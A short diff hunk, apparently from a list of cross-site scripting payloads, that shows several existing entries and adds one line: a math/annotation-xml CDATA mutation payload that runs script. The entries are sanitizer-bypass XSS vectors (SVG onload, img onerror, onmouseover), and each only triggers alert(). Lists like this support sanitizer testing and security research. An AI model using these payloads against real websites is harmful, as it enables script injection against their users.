@@ -1721,3 +1721,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <math><annotation-xml><textarea/><svg><script>alert(1)</script>
 <img onerror=event.path.pop().alert(1) src>
 <input disabled style="position:fixed;top:0;left:0;border:999em solid red;" onmouseover="alert(1)">
+<math><annotation-xml encoding=text/html><![CDATA[></math><!]]><script>var name="&quot;-alert``//"</script>
